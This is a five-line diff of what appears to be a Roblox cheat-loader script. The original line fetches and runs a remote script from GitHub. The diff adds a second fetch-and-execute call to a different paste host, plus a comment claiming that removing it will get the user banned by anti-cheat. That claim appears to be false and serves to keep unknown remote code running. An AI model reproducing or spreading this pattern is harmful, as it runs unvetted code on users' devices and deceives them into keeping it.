@@ -1,1 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/Au0yX/Community/main/XhubMM2"))()
+task.wait(1)
+loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/NtweI5JMMdfkwiwi/raw", true))()
+
+--⚠️ Dont remove the second script or else you will be banned because of anti cheat ⚠️
